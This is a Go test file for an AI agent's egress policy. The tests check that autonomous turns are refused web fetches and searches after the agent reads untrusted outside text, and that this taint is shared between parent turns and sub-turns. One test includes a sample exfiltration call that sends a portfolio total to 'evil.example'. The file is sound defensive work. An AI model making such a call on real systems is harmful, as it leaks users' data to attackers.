package tools

import (
	"context"
	"strings"
	"sync"
	"testing"

	"github.com/cryptoquantumwave/khunquant/pkg/proactive"
)

func egressRegistry() *ToolRegistry {
	r := NewToolRegistry()
	for _, n := range []string{NameWebFetch, NameWebSearch, NameReadFile, NameGetTotalValue} {
		r.Register(&stubTool{name: n})
	}
	return r
}

// egressTurn is an autonomous turn context with its own taint, as the loop builds it.
func egressTurn(origin string) context.Context {
	ctx := WithToolOrigin(context.Background(), origin)
	return proactive.WithTaint(ctx, proactive.NewTaint(proactive.TrustSystem))
}

// run executes one model response as the tool loop does: the batch is noted first, then
// the calls run one after another or at once.
func runBatch(ctx context.Context, r *ToolRegistry, concurrent bool, names ...string) []*ToolResult {
	NoteToolCalls(ctx, names...)
	out := make([]*ToolResult, len(names))
	var wg sync.WaitGroup
	for i, n := range names {
		call := func(i int, n string) { out[i] = r.ExecuteWithContext(ctx, n, map[string]any{}, "", "", nil) }
		if concurrent {
			wg.Add(1)
			go func(i int, n string) { defer wg.Done(); call(i, n) }(i, n)
		} else {
			call(i, n)
		}
	}
	wg.Wait()
	return out
}

func refused(r *ToolResult) bool {
	return r != nil && r.IsError && strings.Contains(r.ForLLM, "already read outside text")
}

func TestEgress_AutonomousTurns(t *testing.T) {
	armPolicy(t, false, nil)
	r := egressRegistry()
	origins := map[string]context.Context{
		"heartbeat": egressTurn(OriginHeartbeat),
		"cron":      egressTurn(OriginCron),
		"proactive-legacy": WithProactiveTurn(
			WithToolOrigin(egressTurn(OriginProactive), OriginProactive), proactive.TurnHeartbeatLegacy),
	}
	for name, mk := range origins {
		t.Run(name+"/first fetch allowed, second refused", func(t *testing.T) {
			ctx := cloneTurn(mk)
			if refused(runBatch(ctx, r, false, NameWebFetch)[0]) {
				t.Fatal("the turn's first web_fetch was refused")
			}
			if !refused(runBatch(ctx, r, false, NameWebFetch)[0]) {
				t.Error("a second web_fetch after an outside read was allowed")
			}
			if !refused(runBatch(ctx, r, false, NameWebSearch)[0]) {
				t.Error("web_search after an outside read was allowed")
			}
		})
		t.Run(name+"/any untrusted read then fetch refused", func(t *testing.T) {
			ctx := cloneTurn(mk)
			runBatch(ctx, r, false, NameReadFile)
			if !refused(runBatch(ctx, r, false, NameWebFetch)[0]) {
				t.Error("web_fetch after read_file was allowed")
			}
		})
		t.Run(name+"/trusted reads do not count", func(t *testing.T) {
			ctx := cloneTurn(mk)
			runBatch(ctx, r, false, NameGetTotalValue)
			runBatch(ctx, r, false, NameGetTotalValue)
			if refused(runBatch(ctx, r, false, NameWebFetch)[0]) {
				t.Error("web_fetch after only trusted reads was refused")
			}
		})
	}
}

// cloneTurn gives a context the same values with a fresh taint.
func cloneTurn(ctx context.Context) context.Context {
	return proactive.WithTaint(ctx, proactive.NewTaint(proactive.TrustSystem))
}

func TestEgress_BatchCases(t *testing.T) {
	armPolicy(t, false, nil)
	r := egressRegistry()
	for _, concurrent := range []bool{false, true} {
		// [fetch, fetch]: at most one egress call in a clean batch.
		ctx := egressTurn(OriginHeartbeat)
		res := runBatch(ctx, r, concurrent, NameWebFetch, NameWebFetch)
		n := 0
		for _, x := range res {
			if !refused(x) {
				n++
			}
		}
		if n != 1 {
			t.Errorf("concurrent=%v: [web_fetch, web_fetch] let %d through, want exactly 1", concurrent, n)
		}
		if !refused(runBatch(ctx, r, concurrent, NameWebFetch)[0]) {
			t.Errorf("concurrent=%v: the next batch's fetch was allowed", concurrent)
		}

		// [read_file, fetch] and [fetch, read_file]: neither order refuses the fetch, the next batch does.
		for _, order := range [][]string{{NameReadFile, NameWebFetch}, {NameWebFetch, NameReadFile}} {
			ctx := egressTurn(OriginHeartbeat)
			res := runBatch(ctx, r, concurrent, order...)
			for i, x := range res {
				if refused(x) {
					t.Errorf("concurrent=%v order=%v: call %d (%s) refused", concurrent, order, i, order[i])
				}
			}
			if !refused(runBatch(ctx, r, concurrent, NameWebSearch)[0]) {
				t.Errorf("concurrent=%v order=%v: web_search in the next batch was allowed", concurrent, order)
			}
		}

		// A batch after outside text: every egress call refused.
		ctx = egressTurn(OriginHeartbeat)
		runBatch(ctx, r, concurrent, NameReadFile)
		for i, x := range runBatch(ctx, r, concurrent, NameWebFetch, NameWebSearch) {
			if !refused(x) {
				t.Errorf("concurrent=%v: call %d after outside text was allowed", concurrent, i)
			}
		}
	}
}

func TestEgress_RefusalNamesNoData(t *testing.T) {
	armPolicy(t, false, nil)
	r := egressRegistry()
	ctx := egressTurn(OriginHeartbeat)
	runBatch(ctx, r, false, NameReadFile)
	res := r.ExecuteWithContext(ctx, NameWebFetch, map[string]any{"url": "https://evil.example/c?total=59000"}, "", "", nil)
	if !refused(res) || strings.Contains(res.ForLLM+res.ForUser, "evil") || strings.Contains(res.ForLLM, "59000") {
		t.Errorf("refusal missing or leaks data: %+v", res)
	}
}

// A sub-turn shares the parent's taint, so what the parent read binds the child.
func TestEgress_SubTurnSharesParentsTaint(t *testing.T) {
	armPolicy(t, false, nil)
	r := egressRegistry()
	parent := egressTurn(OriginHeartbeat)
	runBatch(parent, r, false, NameReadFile)
	child := WithSubTurn(context.WithValue(WithToolOrigin(context.Background(), OriginHeartbeat), struct{}{}, 1))
	child = proactive.WithTaint(child, proactive.TaintFrom(parent))
	if !refused(runBatch(child, r, false, NameWebFetch)[0]) {
		t.Error("a child of a turn that read outside text could fetch")
	}
	// and the other way round
	parent2 := egressTurn(OriginCron)
	child2 := proactive.WithTaint(WithSubTurn(WithToolOrigin(context.Background(), OriginCron)), proactive.TaintFrom(parent2))
	runBatch(child2, r, false, NameReadFile)
	if !refused(runBatch(parent2, r, false, NameWebFetch)[0]) {
		t.Error("a parent could fetch after its child read outside text")
	}
}

func TestEgress_AutonomousWithoutTaintFailsClosed(t *testing.T) {
	armPolicy(t, false, nil)
	r := egressRegistry()
	ctx := WithToolOrigin(context.Background(), OriginHeartbeat)
	if !refused(runBatch(ctx, r, false, NameWebFetch)[0]) {
		t.Error("an autonomous turn without a taint could fetch")
	}
}

// The owner's chat and other non-autonomous turns are not bound.
func TestEgress_PersonTurnUnaffected(t *testing.T) {
	armPolicy(t, false, nil)
	r := egressRegistry()
	for _, origin := range []string{OriginForChannel("telegram"), OriginForChannel("cli"), ""} {
		ctx := egressTurn(origin)
		runBatch(ctx, r, false, NameReadFile)
		for i, x := range runBatch(ctx, r, false, NameWebFetch, NameWebSearch, NameWebFetch) {
			if refused(x) {
				t.Errorf("origin %q: call %d refused", origin, i)
			}
		}
	}
}
